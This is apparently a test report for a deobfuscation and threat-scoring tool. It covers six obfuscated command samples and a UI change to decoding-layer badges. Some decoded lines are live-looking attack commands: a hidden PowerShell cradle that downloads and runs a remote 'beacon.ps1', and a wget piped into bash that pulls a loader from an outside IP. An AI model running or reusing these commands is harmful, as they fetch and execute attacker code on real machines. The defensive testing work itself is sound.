# X-RAY Salvage-Downgrade — Battery Evidence (v1.5.6)

**Run started:** `2026-07-18T18:08:59.723785Z`  ·  **Env:** preview  ·  **API:** `https://greeting-app-5782.preview.emergentagent.com`

## Fix under test
Mid-chain layers that trip `BROKEN`/`MIXED` are downgraded to a softer
`🩵 SALVAGED` badge **iff** the immediately-following layer produced ≥1
clean char without error. Hard red stays for terminal / true dead-ends.

File touched: `frontend/src/components/DecodingTracePanel.jsx` (new `_rawLayerHealth` + `_layerHealth` wrapper).

## Summary

| # | Sample | Wrap | Chain | Verdict | Score | Conf | IOCs | MITRE | HTTP ms | Downgrades | 1st-token match |
|---|---|---|---:|---|---:|---:|---:|---:|---:|---:|:---:|
| 1 | `S1_cobalt_5layer` | `URL(b64(hex(rev(b64(P)))))` | 5 | Malicious | 100 | 100 | 8 | 4 | 18437 | **1** | ✅ |
| 2 | `S2_mshta_3layer` | `URL(rev(b64(P)))` | 1 | Undecoded | 45 | 45 | 8 | 0 | 12299 | **0** | ❌ |
| 3 | `S3_bitsadmin_2layer` | `b64(hex(P))` | 5 | Malicious | 100 | 100 | 8 | 4 | 1734 | **1** | ✅ |
| 4 | `S4_nixwget_2layer` | `b64(gzip(P))` | 3 | Malicious | 100 | 100 | 8 | 1 | 1412 | **1** | ✅ |
| 5 | `S5_regsvr32_5layer` | `URL(b64(hex(rev(b64(P)))))` | 6 | Malicious | 100 | 100 | 8 | 3 | 13341 | **2** | ✅ |
| 6 | `S6_certutil_3layer` | `URL(rev(b64(P)))` | 1 | Undecoded | 45 | 45 | 8 | 0 | 12307 | **0** | ❌ |

## Per-sample layer trace

### S1_cobalt_5layer  ·  `URL(b64(hex(rev(b64(P)))))`

- **Verdict:** `Malicious`  ·  **Score:** `100`  ·  **Confidence:** `100`  ·  **HTTP:** `18437 ms`
- **Expected first token:** `powershell`  ·  **Decoded first line:** `powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://45.148.10.181/beacon.ps1")`
- **Salvage downgrades:** **1**

| Layer | Op | Bytes | BEFORE (raw) | AFTER (v1.5.6) | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `extract-payload` | 395 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L1 | `base64-decode` | 296 | 🟢 `OK` | 🟢 `OK` | b64 len 296 · 4k+0 |
| L2 | `hex-decode` | 148 | 🔴 `BROKEN` | 🩵 `SALVAGED` | non-hex chars → downstream 'reverse' recovered |
| L3 | `reverse` | 148 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L4 | `base64-decode` | 109 | 🟡 `MIXED` | 🟡 `MIXED` | non-b64 chars present |

### S2_mshta_3layer  ·  `URL(rev(b64(P)))`

- **Verdict:** `Undecoded`  ·  **Score:** `45`  ·  **Confidence:** `45`  ·  **HTTP:** `12299 ms`
- **Expected first token:** `mshta.exe`  ·  **Decoded first line:** `3DsTKoU2cvx2Y7kiIlhXZuMGbhNmIo4WdS5SY7kiIsxWZoNlL0BXayN2cXJCK0NWZqJ2TYVmdpR3YBBjMlcXZu1TY6QHcpJ3YzFmdhpGIlhXZuEGdoNXb`
- **Salvage downgrades:** **0**

| Layer | Op | Bytes | BEFORE (raw) | AFTER (v1.5.6) | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `extract-payload` | 117 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### S3_bitsadmin_2layer  ·  `b64(hex(P))`

- **Verdict:** `Malicious`  ·  **Score:** `100`  ·  **Confidence:** `100`  ·  **HTTP:** `1734 ms`
- **Expected first token:** `cmd`  ·  **Decoded first line:** `# --- Bitsadmin File Transfer Detected ---`
- **Salvage downgrades:** **1**

| Layer | Op | Bytes | BEFORE (raw) | AFTER (v1.5.6) | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 180 | 🟢 `OK` | 🟢 `OK` | b64 len 180 · 4k+0 |
| L1 | `hex-decode` | 90 | 🔴 `BROKEN` | 🩵 `SALVAGED` | non-hex chars → downstream 'env-expand' recovered |
| L2 | `env-expand` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L3 | `bitsadmin-annotate` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L4 | `native-cmd-explain` | 134 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### S4_nixwget_2layer  ·  `b64(gzip(P))`

- **Verdict:** `Malicious`  ·  **Score:** `100`  ·  **Confidence:** `100`  ·  **HTTP:** `1412 ms`
- **Expected first token:** `wget`  ·  **Decoded first line:** `wget -qO- http://198.51.100.42/loader.sh | bash`
- **Salvage downgrades:** **1**

| Layer | Op | Bytes | BEFORE (raw) | AFTER (v1.5.6) | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `base64-decode` | 67 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 65 ≡ 4k+1 → downstream 'gzip-decompress' recovered |
| L1 | `gzip-decompress` | 47 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L2 | `download-shell-bg` | 47 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### S5_regsvr32_5layer  ·  `URL(b64(hex(rev(b64(P)))))`

- **Verdict:** `Malicious`  ·  **Score:** `100`  ·  **Confidence:** `100`  ·  **HTTP:** `13341 ms`
- **Expected first token:** `regsvr32`  ·  **Decoded first line:** `# --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---`
- **Salvage downgrades:** **2**

| Layer | Op | Bytes | BEFORE (raw) | AFTER (v1.5.6) | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `extract-payload` | 203 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L1 | `base64-decode` | 152 | 🟢 `OK` | 🟢 `OK` | b64 len 152 · 4k+0 |
| L2 | `hex-decode` | 76 | 🔴 `BROKEN` | 🩵 `SALVAGED` | non-hex chars → downstream 'reverse' recovered |
| L3 | `reverse` | 76 | 🟢 `OK` | 🟢 `OK` | 100% printable |
| L4 | `base64-decode` | 57 | 🔴 `BROKEN` | 🩵 `SALVAGED` | b64 len 53 ≡ 4k+1 → downstream 'regsvr32-annotate' recovered |
| L5 | `regsvr32-annotate` | 57 | 🟢 `OK` | 🟢 `OK` | 100% printable |

### S6_certutil_3layer  ·  `URL(rev(b64(P)))`

- **Verdict:** `Undecoded`  ·  **Score:** `45`  ·  **Confidence:** `45`  ·  **HTTP:** `12307 ms`
- **Expected first token:** `certutil`  ·  **Decoded first line:** `3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y`
- **Salvage downgrades:** **0**

| Layer | Op | Bytes | BEFORE (raw) | AFTER (v1.5.6) | Reason |
|:-:|---|--:|:-:|:-:|---|
| L0 | `extract-payload` | 117 | 🟢 `OK` | 🟢 `OK` | 100% printable |

## Interpretation

- `BROKEN` → `SALVAGED` downgrades appear ONLY when a downstream layer
  in the same trace produced a non-empty, error-free output. The chain
  visibly recovered → red would be misleading.
- The **final layer** of every trace never gets a courtesy downgrade
  (see S1 L4 still `MIXED`, S3 L4 still `OK`) — hard status is
  preserved at chain tail.
- Zero backend changes: this is a pure X-RAY (client-side) UX polish.

## Artifacts

- Raw API dumps: `/app/test_reports/xray_salvage_v156/S1_*.json … S6_*.json`
- This report:   `/app/test_reports/xray_salvage_v156/REPORT.md`
